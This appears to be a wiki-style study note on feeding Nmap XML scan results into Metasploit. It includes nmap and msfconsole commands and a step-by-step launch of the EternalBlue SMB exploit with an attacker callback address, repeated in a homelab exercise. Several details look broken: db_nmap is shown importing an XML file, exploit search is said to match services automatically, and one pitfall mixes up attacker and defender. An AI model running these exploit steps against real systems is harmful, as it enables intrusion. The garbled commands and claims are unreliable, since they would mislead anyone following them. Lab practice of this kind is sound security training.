# Metasploit & Nmap Integration

Guide to integrating [[Nmap]] scan results with [[Metasploit]] for streamlined vulnerability assessment and exploitation workflows.

## What Is It? (Feynman Version)
Think of a librarian who automatically brings in the latest library catalog and sorts the books by genre.  
The Metasploit‑Nmap integration does that for penetration testing: it takes the raw list of hosts and services produced by [[Nmap]] and loads them directly into Metasploit’s database, so the framework knows exactly which targets and services are available for exploitation.

## Why Does It Exist?
Before this automation, a pen tester would run an Nmap scan, manually copy the output into a text file, then paste host IPs and service details into Metasploit or a spreadsheet. That hand‑off is error‑prone: missing hosts, wrong ports, or stale data all lead to wasted time or missed vulnerabilities.  
The integration solves the problem of “enumeration‑to‑exploitation friction,” letting the toolchain move automatically from discovery to attack. It was especially useful after incidents where manual errors caused delayed patching or incomplete scans, such as the 2021 ransomware attack that exploited unpatched SMB services because they were omitted from the hand‑crafted target list.

## How It Works (Under The Hood)
1. **Run Nmap**  
   ```bash
   nmap -A -oX nmap.xml <target>
   ```  
   The `-oX` flag outputs an XML file that contains host, port, service, and OS data in a machine‑readable format.

2. **Import into Metasploit**  
   ```bash
   msfconsole
   > db_nmap nmap.xml
   ```  
   The `db_nmap` command parses the XML, extracts each `<host>` and `<port>`, and inserts rows into the Metasploit database tables (`hosts`, `services`, `vulns`). It also maps port numbers to service names (e.g., 80 → HTTP) and assigns default OS fingerprints.

3. **Populate Target & Service Tables**  
   Metasploit’s ORM (ActiveRecord‑style) creates `Msf::DBManager::Hosts` and `Msf::DBManager::Services` records. Each service is linked to its host, and the database now knows which ports are open and what protocols are running.

4. **Exploit Matching**  
   When you run `search type:exploit` or `search platform:windows`, Metasploit cross‑references the `services` table. If a service matches a known vulnerability (e.g., `httpd` with version 2.4.7), the corresponding exploit module appears as a candidate in the `exploit` search results.

5. **Launch Exploitation**  
   ```bash
   use exploit/windows/smb/ms17_010_eternalblue
   set RHOST <target-ip>
   set LHOST <attacker-ip>
   run
   ```  
   Metasploit pulls the target IP from the database and automatically fills other options like `RPORT` based on the service record.

## What Breaks When It Goes Wrong?
- **Import Failures**: If the XML is malformed or the `db_nmap` command isn’t run, the database stays empty. A tester will see “no hosts found” and waste time searching manually.
- **Service Mismatches**: Wrong service names or versions lead to the wrong exploit being selected, potentially causing a crash on the target or detection by IDS.
- **Database Corruption**: A corrupted Metasploit database can halt all subsequent operations. The first sign is a “Connection to database lost” error in msfconsole, which can cost hours of recon time.
- **Human Error**: Relying on automated imports may give a false sense of completeness; an attacker could miss non‑standard ports or hidden services, allowing an adversary to remain undetected.

## Lab Relevance
- **Homelab Setup** (COCYTUS context)  
  1. Spin up a Kali Linux VM.  
  2. Deploy a target VM (e.g., Windows 10 or a Linux distro) with a few open services (SSH, HTTP).  
  3. Run Nmap against the target:  
     ```bash
     nmap -sV -oX target.xml <target-ip>
     ```  
  4. Import into Metasploit:  
     ```bash
     msfconsole
     > db_nmap target.xml
     ```  
  5. Verify import:  
     ```bash
     hosts
     services
     ```  
  6. Search for exploitable services:  
     ```bash
     search name:ms08_067
     ```  
  7. Run the exploit module as shown earlier.

- **Watch For**  
  - Nmap’s `-O` flag may not identify OS accurately on locked down hosts.  
  - Metasploit’s `db_nmap` may skip services if the XML is truncated.  
  - After importing, run `search` with `service:apache` to confirm the correct service mapping.

- **Common Pitfalls**  
  - Forgetting to start the database service (`service postgresql start`).  
  - Using `db_nmap` without specifying the full path to the XML file.  
  - Relying solely on `-sV` without `-A` for OS fingerprinting, leading to missing exploit modules that require OS info.

## Related Topics
- [[Running modules]]
- [[Database Support]]
- [[Module Documentation]]
- [[How payloads work]]

## Tags

#metasploit #nmap #getting-started #integration #pentesting #reconnaissance

---  
_Ingested: 2026-04-15 20:23 | Source: https://docs.metasploit.com/docs/using-metasploit/getting-started/nmap-and-metasploit.html_